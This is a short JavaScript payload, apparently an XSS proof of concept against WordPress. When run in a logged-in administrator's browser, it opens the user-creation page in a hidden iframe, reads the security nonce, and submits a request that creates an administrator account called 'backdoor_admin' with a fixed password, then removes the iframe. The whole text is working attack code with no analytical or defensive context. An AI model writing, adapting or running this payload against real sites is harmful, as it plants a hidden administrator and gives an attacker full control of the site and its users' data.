(function() {
    // 1. Configuration
    const newUsername = 'backdoor_admin';
    const newEmail = 'hacker@example.com';
    const newPass = 'P@ssword123!';

    // 2. Create a hidden iframe
    const ifr = document.createElement('iframe');
    ifr.style.display = 'none';
    ifr.src = '/wp-admin/user-new.php';
    document.body.appendChild(ifr);

    // 3. Logic to run once the iframe loads
    ifr.onload = function() {
        try {
            const adminDoc = ifr.contentDocument || ifr.contentWindow.document;
            
            // Find the security nonce required to create a user
            const nonceField = adminDoc.querySelector('#_wpnonce_create-user');
            
            if (!nonceField) {
                console.log("Nonce not found. Admin might not be logged in or lacks permissions.");
                return;
            }

            const nonce = nonceField.value;
            console.log("Success! Grabbed Nonce: " + nonce);

            // 4. Use the iframe's context to send the POST request
            // This bypasses ORB because the request originates from the admin context
            const formData = new FormData();
            formData.append('action', 'createuser');
            formData.append('_wpnonce_create-user', nonce);
            formData.append('_wp_http_referer', '/wp-admin/user-new.php');
            formData.append('user_login', newUsername);
            formData.append('email', newEmail);
            formData.append('pass1', newPass);
            formData.append('pass2', newPass);
            formData.append('role', 'administrator');
            formData.append('createuser', 'Add New User');

            fetch('/wp-admin/user-new.php', {
                method: 'POST',
                body: formData,
                credentials: 'include' // Ensures the Admin session cookie is sent
            }).then(() => {
                console.log("PoC Executed: Admin user created.");
                // Cleanup
                document.body.removeChild(ifr);
            });

        } catch (e) {
            console.error("ORB/Same-Origin error: ", e);
        }
    };
})();
